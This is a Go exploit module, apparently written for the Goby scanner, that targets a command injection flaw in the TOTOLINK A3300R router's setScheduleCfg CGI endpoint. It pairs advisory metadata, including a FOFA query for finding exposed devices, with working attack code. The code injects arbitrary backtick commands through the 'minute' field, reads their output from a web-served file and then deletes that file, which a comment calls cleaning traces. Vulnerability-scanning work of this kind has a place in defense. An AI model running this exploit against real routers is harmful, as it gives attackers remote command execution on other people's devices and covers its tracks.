package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TOTOLINK A3300R /cstecgi.cgi setScheduleCfg parameter Command Execution Vulnerability",
    "Description": "<p>TOTOLINK A3300R is a wireless router from China's Gion Electronics (TOTOLINK). </p><p>A command injection vulnerability exists in the TOTOLINK A3300R setScheduleCfg parameter, which can be exploited by an attacker to execute arbitrary commands.</p>",
    "Product": "Totolink-Company-Products",
    "Homepage": "http://www.totolink.cn/",
    "DisclosureDate": "2024-01-12",
    "PostTime": "2024-09-13",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "header=\"SHTTPD\" && header=\"X-UA-Compatible\" && header=\"Pragma: no-cache\"",
    "GobyQuery": "header=\"SHTTPD\" && header=\"X-UA-Compatible\" && header=\"Pragma: no-cache\"",
    "Level": "2",
    "Impact": "<p>The TOTOLINK A3300R suffers from a command injection vulnerability that can be exploited by an attacker to execute arbitrary commands.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.  </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/3/TOTOLINK%20A3300R%20setScheduleCfg.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "TOTOLINK A3300R /cstecgi.cgi setScheduleCfg 参数命令执行漏洞",
            "Product": "TOTO_LINK-公司产品",
            "Description": "<p>TOTOLINK A3300R 是中国吉翁电子（TOTOLINK）公司的一款无线路由器。&nbsp;&nbsp;</p><p>TOTOLINK A3300R setScheduleCfg参数存在命令注入漏洞，攻击者可利用该漏洞执行任意命令。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>TOTOLINK A3300R 参数存在命令注入漏洞，攻击者可利用该漏洞执行任意命令。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TOTOLINK A3300R /cstecgi.cgi setScheduleCfg parameter Command Execution Vulnerability",
            "Product": "Totolink-Company-Products",
            "Description": "<p>TOTOLINK A3300R is a wireless router from China's Gion Electronics (TOTOLINK).&nbsp;</p><p>A command injection vulnerability exists in the TOTOLINK A3300R setScheduleCfg parameter, which can be exploited by an attacker to execute arbitrary commands.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The TOTOLINK A3300R suffers from a command injection vulnerability that can be exploited by an attacker to execute arbitrary commands.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`
setPayloadRequestHash_setScheduleCfg_vdshfgtsdtgfyhsdguft := func(hostInfo *httpclient.FixUrl, command string, echo bool) (string, string, error) {
  //command为原始命令，如果需编码，请自行编码后使用

  //漏洞url地址
  vulURL := "/cgi-bin/cstecgi.cgi"
  requestConfig := httpclient.NewPostRequestConfig(vulURL)
  requestConfig.VerifyTls = false
  requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
  requestConfig.FollowRedirect = false
  tmpFileName := ""
  if echo == true {
    tmpFileName = goutils.RandomHexString(6) + ".txt"
    command = command + ` > /web/` + tmpFileName
  }
  payload :="{\"mode\":\"1\",\"hour\":\"1\",\"minute\":\"14`"+command+"`\",\"week\":\"64\",\"recHour\":\"\",\"topicurl\":\"setScheduleCfg\"}"
  requestConfig.Data = payload
  resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
  if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "true") {
    err = errors.New("failed to RCE")
    return "", vulURL, err
  }
  commandResult := ""
  if echo == true {
    GetrequestConfig := httpclient.NewGetRequestConfig("/" + tmpFileName)
    GetrequestConfig.VerifyTls = false
    GetrequestConfig.FollowRedirect = false
    Getresp, err := httpclient.DoHttpRequest(hostInfo, GetrequestConfig)
    if err != nil || Getresp.StatusCode != 200 {
      err = errors.New("failed to read file")
	  payload ="{\"mode\":\"1\",\"hour\":\"1\",\"minute\":\"14`rm /web/"+tmpFileName+"`\",\"week\":\"64\",\"recHour\":\"\",\"topicurl\":\"setScheduleCfg\"}"
      requestConfig.Data = payload
      httpclient.DoHttpRequest(hostInfo, requestConfig)
      return "", vulURL, err
    }
    commandResult = Getresp.RawBody
    //清理痕迹
    payload ="{\"mode\":\"1\",\"hour\":\"1\",\"minute\":\"14`rm /web/"+tmpFileName+"`\",\"week\":\"64\",\"recHour\":\"\",\"topicurl\":\"setScheduleCfg\"}"
    requestConfig.Data = payload
    httpclient.DoHttpRequest(hostInfo, requestConfig)
    return commandResult, vulURL, nil
  }

  return commandResult, vulURL, nil
}

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  //poc验证函数
  func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    //setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
    runPayload := setPayloadRequestHash_setScheduleCfg_vdshfgtsdtgfyhsdguft

    text := goutils.RandomHexString(16)
    pocCommand := `echo ` + text

    pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand, true)
    if err != nil {
      return false
    }
    if strings.Contains(pocRuselt, text) {
      ss.VulURL = hostInfo.FixedHostInfo + pocUrl
      return true
    }

    return false
  },
  //exp利用函数
  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    //setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
    runPayload := setPayloadRequestHash_setScheduleCfg_vdshfgtsdtgfyhsdguft

    attackType := goutils.B2S(ss.Params["attackType"])
    switch attackType {
    case "cmd":
      //配置命令
      command := goutils.B2S(ss.Params["cmd"])

      Result, _, err := runPayload(expResult.HostInfo, command, true)

      if err != nil {
        expResult.Success = false
        expResult.Output = err.Error()
        return expResult
      }

      if len(Result) > 0 {
        expResult.Success = true
        expResult.Output = Result
        return expResult
      }
    default:
      expResult.Success = false
      expResult.Output = `未知的利用方式`
    }
    return expResult
  },
	))
}
